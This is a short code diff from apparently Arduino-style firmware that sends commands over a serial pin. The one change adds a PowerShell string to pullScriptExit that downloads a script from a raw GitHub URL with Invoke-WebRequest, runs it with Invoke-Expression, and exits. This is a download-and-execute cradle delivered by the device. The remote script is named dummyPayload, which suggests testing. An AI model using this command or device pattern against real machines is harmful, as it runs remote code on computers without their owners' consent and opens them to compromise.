@@ -41,7 +41,7 @@ void SERIALS::pullScriptExit() {
     // oled.clear();
     // oled.printlnString("Sending Command:");
     // oled.printlnString("pullScript");
-    pinSerial.println("$PAYLOAD - PULLSCRIPTEXIT$");
+    pinSerial.println("$PAYLOAD - PULLSCRIPTEXIT$xa$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content); exit");
 }
 
 String SERIALS::pinRead() {
